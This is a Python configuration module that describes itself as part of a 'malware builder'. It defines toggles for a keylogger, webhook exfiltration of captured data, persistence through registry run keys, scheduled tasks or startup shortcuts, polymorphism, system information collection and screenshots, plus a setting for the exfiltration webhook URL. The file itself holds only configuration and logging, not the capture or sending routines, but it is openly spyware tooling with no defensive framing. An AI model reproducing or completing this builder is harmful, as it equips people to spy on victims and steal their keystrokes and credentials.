"""
Configuration settings for the malware builder.
"""

from typing import Dict, List, Optional
from datetime import datetime


class BuilderConfig:
    """Manages all configuration settings for the malware builder."""
    
    def __init__(self):
        self.features = {
            'core_keylogger': True,
            'log_to_file': True,
            'webhook_exfiltration': False,
            'persistence': False,
            'polymorphism': False,
            'uninstall_script': False,
            'debug_mode': False,
            'system_info_collection': False,
            'startup_screenshot': False
        }
        
        self.persistence_options = {
            'registry_run': False,
            'task_scheduler': False,
            'startup_shortcut': False
        }
        
        self.settings = {
            'webhook_url': '',
            'flush_interval': 10,
            'output_dir': 'build_output'
        }
        
        self.build_log = []
        
    def toggle_feature(self, feature_name: str) -> bool:
        """Toggle a feature on/off and return the new state."""
        if feature_name in self.features:
            self.features[feature_name] = not self.features[feature_name]
            self.build_log.append(f"Toggled {feature_name}: {self.features[feature_name]}")
            return self.features[feature_name]
        return False
        
    def toggle_persistence_option(self, option_name: str) -> bool:
        """Toggle a persistence option on/off and return the new state."""
        if option_name in self.persistence_options:
            self.persistence_options[option_name] = not self.persistence_options[option_name]
            self.build_log.append(f"Toggled persistence {option_name}: {self.persistence_options[option_name]}")
            return self.persistence_options[option_name]
        return False
        
    def set_webhook_url(self, url: str) -> None:
        """Set the webhook URL."""
        self.settings['webhook_url'] = url
        self.build_log.append(f"Set webhook URL: {url}")
        
    def set_flush_interval(self, interval: int) -> None:
        """Set the flush interval in seconds."""
        if interval > 0:
            self.settings['flush_interval'] = interval
            self.build_log.append(f"Set flush interval: {interval}")
            
    def add_build_log_entry(self, entry: str) -> None:
        """Add an entry to the build log."""
        self.build_log.append(entry)
        
    def get_build_info(self) -> Dict:
        """Get complete build information for logging."""
        return {
            'timestamp': datetime.now().isoformat(),
            'features': self.features.copy(),
            'persistence_options': self.persistence_options.copy(),
            'settings': self.settings.copy(),
            'build_log': self.build_log.copy()
        } 